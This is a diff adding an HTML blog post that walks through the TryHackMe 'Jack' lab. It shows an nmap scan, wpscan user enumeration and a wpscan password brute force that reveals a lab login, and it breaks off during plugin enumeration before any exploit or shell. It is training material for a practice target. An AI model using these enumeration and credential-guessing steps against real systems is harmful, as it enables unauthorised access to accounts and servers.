@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Jack :: northmatrix</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overview Jack is a hard ranked TryHackMe room where we must exploit a vulnerable wordpress plugin to gain access to the administrator dashboard and from there upload a reverseshell to gain access to the server. Where we must then enumerate and look for ways to escalate our privileges.
+Wordpress Enumeration &amp; Exploitation Enumeration First we add the hostname jack.thm to our /etc/hosts. Then we can begin by running a nmap scan against the server to get a brief idea of what is running.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/2025-07-20-jack/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="//localhost:1313/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="northmatrix.github.io" />
+  
+    <meta name="twitter:creator" content="northmatrix" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Jack">
+<meta property="og:description" content="Overview Jack is a hard ranked TryHackMe room where we must exploit a vulnerable wordpress plugin to gain access to the administrator dashboard and from there upload a reverseshell to gain access to the server. Where we must then enumerate and look for ways to escalate our privileges.
+Wordpress Enumeration &amp; Exploitation Enumeration First we add the hostname jack.thm to our /etc/hosts. Then we can begin by running a nmap scan against the server to get a brief idea of what is running.
+" />
+<meta property="og:url" content="//localhost:1313/posts/2025-07-20-jack/" />
+<meta property="og:site_name" content="northmatrix" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+    loader: {
+      load: ["ui/safe"],
+    },
+    chtml: {
+      scale: 1.4,
+    },
+  };
+</script>
+
+  
+  <link rel="stylesheet" href="/css/syntax.css">
+</head>
+<body>
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Northmatrix
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/2025-07-20-jack/">Jack</a>
+  </h1>
+  <div class="post-meta"><span class="post-author">northmatrix</span><span class="post-reading-time">15 min read (3008 words)</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Jack is a hard ranked TryHackMe room where we must exploit a vulnerable wordpress plugin to gain access to the administrator dashboard and from there upload a reverseshell to gain access to the server. Where we must then enumerate and look for ways to escalate our privileges.</p>
+<p><img src="Pasted%20image%2020250720142549.png" alt=""></p>
+<h2 id="wordpress-enumeration--exploitation">Wordpress Enumeration &amp; Exploitation<a href="#wordpress-enumeration--exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>First we add the hostname <code>jack.thm</code> to our <code>/etc/hosts</code>. Then we can begin by running a nmap scan against the server to get a brief idea of what is running.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ip-10-10-118-239:~# nmap -sT -T5 -pjack.thm
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-20 14:31 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> jack.thm <span class="o">(</span>10.10.76.232<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 02:66:3C:95:32:B3 <span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.43 seconds
+</span></span></code></pre></div><p>Now we visit jack.thm to begin our enumration of the website.</p>
+<p><img src="Pasted%20image%2020250720143419.png" alt=""></p>
+<p>Looking at the page source we can see it is referencing <code>wp-includes</code> this indicates that this website / blog is running on wordpress.</p>
+<p><img src="Pasted%20image%2020250720143603.png" alt=""></p>
+<p>We can now begin a targeted enumeration against the wordpress using <code>wpscan</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ip-10-10-118-239:~# wpscan --url jack.thm -e u
+</span></span><span class="line"><span class="cl">_______________________________________________________________
+</span></span><span class="line"><span class="cl">         __          _______   _____
+</span></span><span class="line"><span class="cl">         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span></span><span class="line"><span class="cl">          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
+</span></span><span class="line"><span class="cl">           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \
+</span></span></span><span class="line"><span class="cl"><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span class="line"><span class="cl"><span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span class="line"><span class="cl"><span class="s1">                         Version 3.8.28
+</span></span></span><span class="line"><span class="cl"><span class="s1">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span class="line"><span class="cl"><span class="s1">_______________________________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] URL: http://jack.thm/ [10.10.76.232]
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Started: Sun Jul 20 14:41:33 2025
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Interesting Finding(s):
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Headers
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Headers (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] robots.txt found: http://jack.thm/robots.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Interesting Entries:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - /wp-admin/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - /wp-admin/admin-ajax.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Robots Txt (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress readme found: http://jack.thm/readme.html
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 60%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Rss Generator (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress theme in use: online-portfolio
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Location: http://jack.thm/wp-content/themes/online-portfolio/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Last Updated: 2024-02-05T00:00:00.000Z
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | [!] The version is out of date, the latest version is 0.1.1
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style Name: Online Portfolio
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author: Ample Themes
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author URI: https://amplethemes.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confirmed By: Css Style In 404 Page (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Version: 0.0.7 (80% confidence)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Style (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: &#39;</span>Version: 0.0.7<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &lt;<span class="o">=====================================================================================================================================</span>&gt; <span class="o">(</span><span class="m">10</span> / 10<span class="o">)</span> 100.00% Time: 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> jack
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> danny
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> wendy
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Finished: Sun Jul <span class="m">20</span> 14:41:38 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">30</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">38</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Sent: 7.527 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Received: 230.207 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Memory used: 194.738 MB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:00:05
+</span></span></code></pre></div><h3 id="password-cracking">Password Cracking<a href="#password-cracking" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>From this we can see there are multiple users lets see if we can crack any of their passwords.</p>
+<pre tabindex="0"><code>root@ip-10-10-118-239:~# wpscan --url jack.thm -U usernames -P /usr/share/wordlists/fasttrack.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://jack.thm/ [10.10.76.232]
+[+] Started: Sun Jul 20 14:43:36 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://jack.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://jack.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+ |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+
+[+] WordPress theme in use: online-portfolio
+ | Location: http://jack.thm/wp-content/themes/online-portfolio/
+ | Last Updated: 2024-02-05T00:00:00.000Z
+ | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
+ | [!] The version is out of date, the latest version is 0.1.1
+ | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
+ | Style Name: Online Portfolio
+ | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
+ | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
+ | Author: Ample Themes
+ | Author URI: https://amplethemes.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 0.0.7 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: &#39;Version: 0.0.7&#39;
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;====================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - wendy / changelater                                                                                                                                                                                    
+Trying danny / starwars Time: 00:00:08 &lt;====================================================================================================                                    &gt; (646 / 867) 74.50%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: wendy, Password: c*********r
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Jul 20 14:43:54 2025
+[+] Requests Done: 788
+[+] Cached Requests: 37
+[+] Data Sent: 363.732 KB
+[+] Data Received: 451.096 KB
+[+] Memory used: 303.801 MB
+[+] Elapsed time: 00:00:17
+</code></pre><h3 id="initial-access">Initial Access<a href="#initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>From here we can see we found the Password <code>c*********r</code> for User <code>wendy</code>. We can now login to the wordpress dashboard.<br>
+<img src="Pasted%20image%2020250720145513.png" alt=""></p>
+<p>This is not an administrator dashboard and we are thus limited in what we can do. To be able to modify templates and plugins (the most common way for rce) we need to have admin dashboard to achieve this we can begin by enumerating installed plugins using <code>wpscan</code> to see if there are any vulnerable ones that may allow us to upgrade our privilege.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ip-10-10-118-239:~# wpscan --url jack.thm --enumerate p --plugins-detection aggressive
+</span></span><span class="line"><span class="cl">_______________________________________________________________
+</span></span><span class="line"><span class="cl">         __          _______   _____
+</span></span><span class="line"><span class="cl">         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span></span><span class="line"><span class="cl">          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
+</span></span><span class="line"><span class="cl">           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \
+</span></span></span><span class="line"><span class="cl"><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span class="line"><span class="cl"><span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span class="line"><span class="cl"><span class="s1">                         Version 3.8.28
+</span></span></span><span class="line"><span class="cl"><span class="s1">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span class="line"><span class="cl"><span class="s1">_______________________________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] URL: http://jack.thm/ [10.10.76.232]
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Started: Sun Jul 20 14:52:44 2025
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Interesting Finding(s):
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Headers
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Headers (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] robots.txt found: http://jack.thm/robots.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Interesting Entries:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - /wp-admin/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - /wp-admin/admin-ajax.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Robots Txt (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress readme found: http://jack.thm/readme.html
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
